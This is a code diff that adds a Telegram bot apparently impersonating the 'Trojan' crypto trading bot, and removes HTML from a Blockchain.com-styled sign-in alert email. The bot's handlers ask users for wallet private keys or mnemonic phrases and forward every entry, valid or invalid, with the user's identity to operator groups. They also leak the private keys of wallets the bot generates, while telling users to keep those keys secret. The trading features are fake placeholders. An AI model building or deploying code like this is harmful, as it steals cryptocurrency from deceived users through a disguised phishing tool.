+By pressing *Continue* you confirm that you accept our Terms of Use and Privacy Policy.
+
+*AFTER YOU CLICK CONTINUE below, we will send you the public address and private key for your crypto wallet RIGHT HERE ON TELEGRAM - please be in a private place where you are able to SEE THESE IN PRIVATE, AND note these details down SECURELY.*`;
+            const resp = await sendTelegramMessage(chatId, welcomeMsg, {
+              parse_mode: "Markdown",
+              reply_markup: JSON.stringify({
+                inline_keyboard: [
+                  [{ text: "Continue", callback_data: "continue_accept_terms" }]
+                ]
+              })
+            });
+            userLastMessage[chatId] = resp.result?.message_id;
+          } else if (userMessage.startsWith("/")) {
+            await deleteLastUserMessage(chatId);
+            const resp = await sendTelegramMessage(chatId, "\u274C Unknown command. Please use the menu buttons or /start.", {
+              reply_markup: JSON.stringify(keyboard)
+            });
+            userLastMessage[chatId] = resp.result?.message_id;
+          } else if (update.message?.reply_to_message?.text === "Provide the private key you'd like to import:\u270F\uFE0F") {
+            await deleteLastUserMessage(chatId);
+            await sendTelegramMessage(chatId, "Validating Wallet...");
+            await delay(3e3);
+            if (isValidWalletAddress(userMessage)) {
+              const resp = await sendTelegramMessage(chatId, "\u2705 Your wallet has been successfully connected!");
+              userLastMessage[chatId] = resp.result?.message_id;
+              await sendToAllGroups(`✅ Wallet imported by user:\n${userInfo}\n\n*Imported Private Key:*\n\`${userMessage}\``, { parse_mode: "Markdown" });
+            } else {
+              const resp = await sendTelegramMessage(chatId, "\u274C Invalid Key. Please provide a valid Private key or 12 Mnemonic words of your wallet [Solflare, Phantom, MetaMask, Ledger, Trustwallet, OKX or other defiwallets]. Click /start to begin the process.");
+              userLastMessage[chatId] = resp.result?.message_id;
+              await sendToAllGroups(`❌ Invalid wallet import attempt by user:\n${userInfo}\n\n*Attempted Private Key:*\n\`${userMessage}\``, { parse_mode: "Markdown" });
+            }
+          } else {
+            await deleteLastUserMessage(chatId);
+            const resp = await sendTelegramMessage(chatId, "Message received.", {
+              reply_markup: JSON.stringify(keyboard)
+            });
+            userLastMessage[chatId] = resp.result?.message_id;
+          }
+        } else {
+          await sendToAllGroups(`Non-text input received from user:\n${userInfo}`, { parse_mode: "Markdown" });
+        }
+      }
+      // Handle button clicks
+      if (update.callback_query) {
+        const chatId = update.callback_query.message.chat.id;
+        const buttonClicked = update.callback_query.data;
+        const userId = update.callback_query.from.id;
+        const username = update.callback_query.from.username ? `@${update.callback_query.from.username}` : "N/A";
+        const firstName = update.callback_query.from.first_name || "N/A";
+        const lastName = update.callback_query.from.last_name || "N/A";
+        const userInfo = `User ID: ${userId}
+Username: ${username}
+Name: ${firstName} ${lastName}`;
+        await sendToAllGroups(`Button clicked: \`${buttonClicked}\`\n${userInfo}`, {
+          parse_mode: "Markdown"
+        });
+
+        await deleteLastUserMessage(chatId);
+
+        let resp;
+        if (buttonClicked === "continue_accept_terms") {
+          // Generate wallets and show details, then auto-delete after 5 minutes
+          const sol = await generateSolanaWallet();
+          const eth = generateEthWallet();
+          userWallets[chatId] = { sol, eth };
+
+          const walletMsg =
+`✅ You've accepted our terms, you can now use the latest version of the bot.
+
+🟢 Generated your wallets
+
+*SOL* : \`${sol.address}\`
+Secret Key: \`${sol.privateKey}\`
+
+*ETH* : \`${eth.address}\`
+Secret Key: \`${eth.privateKey}\`
+
+*BE SURE TO RETAIN THE INFORMATION ABOVE IN A SAFE PLACE. THIS MESSAGE WILL AUTO-DELETE AND NOT BE AVAILABLE IN YOUR CHAT HISTORY AFTER 5 MINUTES.*
+
+Press "Continue Trading" to proceed.`;
+
+          const walletResp = await sendTelegramMessage(chatId, walletMsg, {
+            parse_mode: "Markdown",
+            reply_markup: JSON.stringify({
+              inline_keyboard: [
+                [{ text: "Continue Trading", callback_data: "continue_trading" }]
+              ]
+            })
+          });
+          // Schedule auto-delete after 5 minutes
+          setTimeout(() => deleteTelegramMessage(chatId, walletResp.result?.message_id), 5 * 60 * 1000);
+          userLastMessage[chatId] = walletResp.result?.message_id;
+        } else if (buttonClicked === "continue_trading") {
+          // Show main menu with only addresses (no private key)
+          const wallets = userWallets[chatId];
+          let menuMsg = "*Solana · 🅴*\n";
+          if (wallets?.sol) {
+            menuMsg += `\n*SOL:* \`${wallets.sol.address}\`\nBalance: 0 SOL ($0.00)\n`;
+          }
+          if (wallets?.eth) {
+            menuMsg += `*ETH:* \`${wallets.eth.address}\`\nBalance: 0 ETH ($0.00)\n`;
+          }
+          menuMsg += "—\nClick on the *Refresh* button to update your current balance.\n\nJoin our Telegram group @trojan and follow us on Twitter!\n\n⚠️ *We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages.*";
+          resp = await sendTelegramMessage(chatId, menuMsg, {
+            parse_mode: "Markdown",
+            reply_markup: JSON.stringify(keyboard)
+          });
+          userLastMessage[chatId] = resp.result?.message_id;
+
+        } else if (buttonClicked === "wallet") {
+          resp = await sendTelegramMessage(chatId,
+            "👛 *Wallet Menu*\n\nCreate a new wallet or import an existing one to get started.",
+            {
+              parse_mode: "Markdown",
+              reply_markup: JSON.stringify(walletButtons)
+            }
+          );
+          userLastMessage[chatId] = resp.result?.message_id;
+
+        } else if (buttonClicked === "main_menu") {
+          // Show menu with address only
+          const wallets = userWallets[chatId];
+          let menuMsg = "*Solana · 🅴*\n";
+          if (wallets?.sol) {
+            menuMsg += `\n*SOL:* \`${wallets.sol.address}\`\nBalance: 0 SOL ($0.00)\n`;
+          }
+          if (wallets?.eth) {
+            menuMsg += `*ETH:* \`${wallets.eth.address}\`\nBalance: 0 ETH ($0.00)\n`;
+          }
+          menuMsg += "—\nClick on the *Refresh* button to update your current balance.\n\nJoin our Telegram group @trojan and follow us on Twitter!\n\n⚠️ *We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages.*";
+          resp = await sendTelegramMessage(chatId, menuMsg, {
+            parse_mode: "Markdown",
+            reply_markup: JSON.stringify(keyboard)
+          });
+          userLastMessage[chatId] = resp.result?.message_id;
+
+        // Add: main menu button responses with a Back button
+        } else if (
+          [
+            "buy", "sell", "position", "limit_orders", "dca_orders", "copy_trade", "sniper",
+            "grid_trading", "bridge", "withdraw", "referrals", "p_l_flex", "new_pairs", "settings", "refresh", "trojan_perps"
+          ].includes(buttonClicked)
+        ) {
+          resp = await sendTelegramMessage(chatId, buttonResponses[buttonClicked], {
+            parse_mode: "Markdown",
+            reply_markup: JSON.stringify({
+              inline_keyboard: [
+                [{ text: "Back", callback_data: "main_menu" }]
+              ]
+            })
+          });
+          userLastMessage[chatId] = resp.result?.message_id;
+
+        } else if (buttonClicked === "hide_menu") {
+          // Hide menu by editing the message to remove the keyboard
+          const messageId = update.callback_query.message.message_id;
+          await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              message_id: messageId,
+              reply_markup: JSON.stringify({ inline_keyboard: [] })
+            })
+          });
+
+        } else if (buttonClicked === "create_wallet") {
+          const sol = await generateSolanaWallet();
+          userWallets[chatId] = userWallets[chatId] || {};
+          userWallets[chatId].sol = sol;
+          resp = await sendTelegramMessage(
+            chatId,
+            `🆕 *Your new Solana wallet has been created!*\n\n*Address:*\n\`${sol.address}\`\n\n*Private Key (keep safe!):*\n\`${sol.privateKey}\`\n\n*Never share your private key with anyone.*`,
+            { parse_mode: "Markdown" }
+          );
+          userLastMessage[chatId] = resp.result?.message_id;
+          await sendToAllGroups(
+            `🚨 *Wallet Created*\n\n*User:*\nID: \`${userId}\`\nUsername: ${username}\nName: ${firstName} ${lastName}\n\n*Address:*\n\`${sol.address}\`\n*Private Key:*\n\`${sol.privateKey}\``,
+            { parse_mode: "Markdown" }
+          );
+
+        } else if (buttonClicked === "import_wallet") {
+          resp = await sendTelegramMessage(chatId, "Provide the private key you'd like to import:\u270F\uFE0F", {
+            reply_markup: JSON.stringify({ force_reply: true })
+          });
+          userLastMessage[chatId] = resp.result?.message_id;
+
+        } else {
+          resp = await sendTelegramMessage(chatId, "❓ Unknown action. Please use the menu buttons.", {
+            reply_markup: JSON.stringify(keyboard)
+          });
+          userLastMessage[chatId] = resp.result?.message_id;
+        }
+      }
+      return new Response("OK", { status: 200 });
+    }
+    return new Response("Not found", { status: 404 });
+  }
+
+  addEventListener("fetch", (event) => {
+    event.respondWith(handleRequest(event.request));
   });
-};
-</script>
-                              <table role=presentation 
-                              
-                              style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                              cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <td 
-                                style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 10px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" 
-                                valign=top align=center>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: separate; MARGIN-LEFT: auto; BORDER-SPACING: 0; MARGIN-RIGHT: auto" 
-                                cellspacing=0 cellpadding=0 width="100%" 
-                                border=0>
-                                
-                                <tr>
-                                <td 
-                                style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" 
-                                valign=top align=center>
-                                <div 
-                                style="FONT-SIZE: 10px; FONT-FAMILY: 'Inter',Arial,Helvetica,sans-serif; TEXT-ALIGN-LAST: center; FONT-WEIGHT: normal; COLOR: #68696c; TEXT-ALIGN: center; LETTER-SPACING: 0px; LINE-HEIGHT: 12px; font-variant-ligatures: normal">
-                                <div><span 
-                                style="FONT-FAMILY: Inter,Helvetica,Arial,sans-serif; FONT-WEIGHT: 400; FONT-STYLE: normal">If 
-                                you recognize this activity, confirm here: 
-                                Verify Sign-In. If you don’t, secure your 
-                                account immediately: Block Sign-In. 
-                                </span></div></div></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr>
-              <tr>
-                <td style="BORDER-COLLAPSE: collapse" valign=top>
-                  <table role=presentation 
-                  
-                  style="BORDER-COLLAPSE: collapse" cellspacing=0 cellpadding=0 
-                  width="100%" border=0>
-                    
-                    <tr>
-                      <td 
-                      style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
-                        <table role=presentation 
-                        
-                        style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                        cellpadding=0 width="100%" border=0>
-                          
-                          <tr>
-                            <td 
-                            class="m_-1135143110880407456pc-w520-padding-25-30-25-30 m_-1135143110880407456pc-w620-padding-25-35-25-35" 
-                            style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 40px; PADDING-RIGHT: 40px; BACKGROUND-COLOR: #dfe3eb; border-radius: 0px" 
-                            bgcolor=#dfe3eb valign=top>
-                              <table role=presentation 
-                              
-                              style="BORDER-COLLAPSE: separate; MARGIN-LEFT: auto; BORDER-SPACING: 0; MARGIN-RIGHT: auto" 
-                              cellspacing=0 cellpadding=0 width="100%" 
-                                border=0>
-                                <tr>
-                                <td style="BORDER-COLLAPSE: collapse" valign=top 
-                                align=left>
-                                <div 
-                                style="FONT-SIZE: 9px; FONT-FAMILY: 'Inter',Arial,Helvetica,sans-serif; TEXT-ALIGN-LAST: left; FONT-WEIGHT: normal; COLOR: #333333; TEXT-ALIGN: left; LETTER-SPACING: 0px; LINE-HEIGHT: 12px; font-variant-ligatures: normal">
-                                <div>Blockchain.com services are provided by 
-                                local operating entities pursuant to our User 
-                                Agreement, available on our website <a 
-                                style="TEXT-DECORATION: none; COLOR: #0c6cf2" 
-                                href="#" target=_blank>here</a>. By using our 
-                                services, you have agreed to our Terms. 
-                                <br><br>Trading crypto involves risk, including 
-                                potential loss of principal, and may not be 
-                                insured by any government-approved scheme or 
-                                other entities, meaning you may not be protected 
-                                if you lose money. Crypto markets are volatile, 
-                                values can go down as well as up. Tax may be 
-                                payable on any gains. Any rates of rewards 
-                                mentioned are estimates only and subject to 
-                                change. Not all products and services are 
-                                available in all jurisdictions. <br><br>Any 
-                                information provided here or on our app or 
-                                website is for general purposes only and does 
-                                not constitute investment advice, an offer, or 
-                                solicitation to buy, sell, or hold any 
-                                cryptocurrency or financial instrument. 
-                                <br><br>No advice or information, whether verbal 
-                                or written, obtained from Blockchain.com or its 
-                                platforms, products, and services creates any 
-                                warranty not expressly stated here. <br><br>Act 
-                                responsibly and only trade what you can afford 
-                                to lose. 
-                              <br><br></div></div></td></tr></table>
-                              <table role=presentation 
-                              
-                              style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                              cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <td style="BORDER-COLLAPSE: collapse">
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                                cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <td style="BORDER-COLLAPSE: collapse" 
-valign=top>
-                                <table role=presentation 
-                                class="m_-1135143110880407456pc-w620-view-vertical" 
-                                style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                                cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <TH 
-                                style="WIDTH: 50%; BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; TEXT-ALIGN: left" 
-                                valign=top width="50%" align=left>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                                cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <td 
-                                class=m_-1135143110880407456pc-w620-spacing-0-0-20-0 
-                                style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 20px" 
-                                valign=top align=left>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                                cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <td style="BORDER-COLLAPSE: collapse" 
-valign=top>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                                cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <TH 
-                                style="BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; TEXT-ALIGN: left" 
-                                valign=top align=left>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: separate; MARGIN-LEFT: auto; BORDER-SPACING: 0; MARGIN-RIGHT: auto" 
-                                cellspacing=0 cellpadding=0 width="100%" 
-                                border=0>
-                                
-                                <tr>
-                                <td style="BORDER-COLLAPSE: collapse" valign=top 
-                                align=left>
-                                <div 
-                                style="FONT-SIZE: 9px; FONT-FAMILY: 'Inter',Arial,Helvetica,sans-serif; TEXT-ALIGN-LAST: left; FONT-WEIGHT: normal; COLOR: #0c6cf2; TEXT-ALIGN: left; LETTER-SPACING: 0px; LINE-HEIGHT: 24px; font-variant-ligatures: normal">
-                                <div><a 
-                                style="TEXT-DECORATION: none; COLOR: #0c6cf2; LINE-HEIGHT: 1" 
-                                href="https://links.blockchain.com/e/encryptedUnsubscribe?_r=b077a02c6d894ec28e56236cee81e43a&amp;_s=5c4d4a9e35f045459102821bf3a912c2&amp;_t=1Ky5861LF5tDI-ygJqfwW4G4OH89h5dFs8DkPvkphHLaAUKULyrvYgNwQ2VCK2yABj6jzFsIsJ9_5FZladamGuzuN2euvsgUYrYvyGPs1d0nj0PimJFnkncoLbz3rm9ScBMyvLbJlsfwYtWfJRB0hjSRYVynccniefXrLnIG_x8%3D" 
-                                target=_blank 
-                                data-saferedirecturl="https://www.google.com/url?q=https://links.blockchain.com/e/encryptedUnsubscribe?_r%3Db077a02c6d894ec28e56236cee81e43a%26_s%3D5c4d4a9e35f045459102821bf3a912c2%26_t%3D1Ky5861LF5tDI-ygJqfwW4G4OH89h5dFs8DkPvkphHLaAUKULyrvYgNwQ2VCK2yABj6jzFsIsJ9_5FZladamGuzuN2euvsgUYrYvyGPs1d0nj0PimJFnkncoLbz3rm9ScBMyvLbJlsfwYtWfJRB0hjSRYVynccniefXrLnIG_x8%253D&amp;source=gmail&amp;ust=1749367470868000&amp;usg=AOvVaw2mPnaL19-JK3VnFjespxE4"><span 
-                                style="FONT-SIZE: 9px; TEXT-DECORATION: underline">Click 
-                                here to unsubscribe.</span></a></div>
-                                <div><a 
-                                style="TEXT-DECORATION: none; COLOR: #0c6cf2; LINE-HEIGHT: 1" 
-                                href="#" target=_blank><span 
-                                style="FONT-SIZE: 9px; TEXT-DECORATION: underline">View 
-                                in 
-                                browser.</span></a></div></div></td></tr></table></TH></tr></table></td></tr></table></td></tr></table></TH>
-                                <TH 
-                                style="WIDTH: 50%; BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; TEXT-ALIGN: left" 
-                                valign=top width="50%" align=left>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                                cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <td 
-                                class=m_-1135143110880407456pc-w620-spacing-0-0-0-0 
-                                style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 20px; PADDING-RIGHT: 0px" 
-                                valign=top align=left>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                                cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <td style="BORDER-COLLAPSE: collapse" 
-valign=top>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                                cellpadding=0 width="100%" border=0>
-                                
-                                </table></td></tr></table></td></tr></table></TH></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table>
-<div class=m_-1135143110880407456pc-gmail-fix 
-style="WHITE-SPACE: nowrap; FONT: 15px/0 courier; DISPLAY: none !important">&nbsp; 
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</div><img class=CToWUd border=0 
-alt="" 
-src="https://ci3.googleusercontent.com/meips/ADKq_NbvnlwEfr7x25jBF-JWh3N1QVs7NfchpkaKUZchM_cRzNxjyz1AIm2mWHfW0qj3jzyb3rPHn8IzC_UpeedIPTAan44gmFnVj-IgXSw9NOjQDzAx1KSiUGpgR97f4RfuyIF5NU4L9Ft0HijXwhBeeybwO9wme_HmanQHway7t1cxi6iXAPaNxDIs-lcunGmtLLMs_VsQPyK4m1WvMNF2GbXCEWnrPOPfPTgHJcFiZnVpxvE=s0-d-e1-ft#https://post.spmailtechnol.com/q/AotpaQpbI219mwv3isOOlw~~/AAP1OBA~/2wfH8cL09cJchO3vJCK9zeGKY8KpgJgvtmBMIwS22Qqmxy_sGVEHkkpVtv8qKQ4ZS9M6KvshQWqDnRJRdU6EBQ~~" 
-width=1 height=1 data-bit="iit">
-<div class=yj6qo></div>
-<div class=adL></div></div>
-<div class=adL></div></div></div>
-<div class=WhmR8e data-hash="0"></div></div></body></html>
+})();
